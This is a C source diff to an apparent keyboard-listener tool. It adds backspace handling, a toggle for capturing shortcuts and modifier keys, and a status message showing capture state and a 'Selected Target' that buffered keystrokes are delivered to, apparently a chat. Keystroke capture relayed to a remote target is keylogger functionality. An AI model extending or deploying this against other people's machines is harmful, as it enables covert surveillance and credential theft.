@@ -224,6 +224,46 @@ void keyboard_output_append(const char *text, size_t length)
     queue_unlock();
 }
 
+void keyboard_output_backspace(void)
+{
+    if (keyboard_paused)
+        return;
+
+    queue_lock();
+    total_keyboard_keystrokes++;
+    if (text_buffer_len > 0) {
+        size_t pos = text_buffer_len;
+        --pos;
+        while (pos > 0 && ((unsigned char)text_buffer[pos] & 0xC0) == 0x80) {
+            --pos;
+        }
+        for (size_t i = pos; i < text_buffer_len; i++) {
+            text_buffer[i] = '\0';
+        }
+        text_buffer_len = pos;
+        last_key_time_ms = get_monotonic_ms();
+    }
+    queue_unlock();
+}
+
+static volatile int keyboard_shortcuts_enabled = 0;
+
+int keyboard_get_shortcuts_enabled(void)
+{
+    return keyboard_shortcuts_enabled;
+}
+
+void keyboard_set_shortcuts_enabled(int enabled)
+{
+    keyboard_shortcuts_enabled = enabled ? 1 : 0;
+}
+
+int keyboard_toggle_shortcuts(void)
+{
+    keyboard_shortcuts_enabled = !keyboard_shortcuts_enabled;
+    return keyboard_shortcuts_enabled;
+}
+
 static volatile int keyboard_format_mode = KEYBOARD_MODE_CODE;
 
 static void deliver_event(const keyboard_event_t *event)
@@ -376,6 +416,7 @@ void keyboard_get_status_info(char *buffer, size_t max_len)
              "⌨️ <b>Keyboard Listener Status</b>\n\n"
              "• <b>Status:</b> %s\n"
              "• <b>Active Layout:</b> %s\n"
+             "• <b>Shortcuts &amp; Modifiers:</b> %s\n"
              "• <b>Total Delivered:</b> %s in %llu keystrokes\n"
              "• <b>Format Mode:</b> %s\n"
              "• <b>Selected Target:</b> <code>%s</code>\n"
@@ -385,6 +426,7 @@ void keyboard_get_status_info(char *buffer, size_t max_len)
              "• <b>Inactivity Flush:</b> %llu ms",
              paused ? "⏸️ <b>PAUSED</b> (Muted)" : "🟢 <b>ACTIVE</b> (Capturing)",
              layout_name,
+             keyboard_shortcuts_enabled ? "🟢 <b>ENABLED</b> (Capturing [Ctrl+C], [Alt+...], etc.)" : "⚪ <b>DISABLED</b> (Clean typing text only)",
              tot_str, (unsigned long long)tot_keys,
              mode == KEYBOARD_MODE_CODE ? "<code>Code Block (&lt;pre&gt;&lt;code&gt;)</code>" : "<code>Raw Plain Text</code>",
              target,
@@ -427,6 +469,7 @@ int keyboard_output_init(void)
     retry_delay_ms = c2t_config_get()->retry_delay_ms;
     inactivity_flush_ms = c2t_config_get()->keyboard_flush_ms > 0
         ? c2t_config_get()->keyboard_flush_ms : KEYBOARD_DEFAULT_FLUSH_MS;
+    keyboard_shortcuts_enabled = c2t_config_get()->keyboard_shortcuts;
     stopping = 0;
     keyboard_paused = 0;
     text_buffer_len = 0;
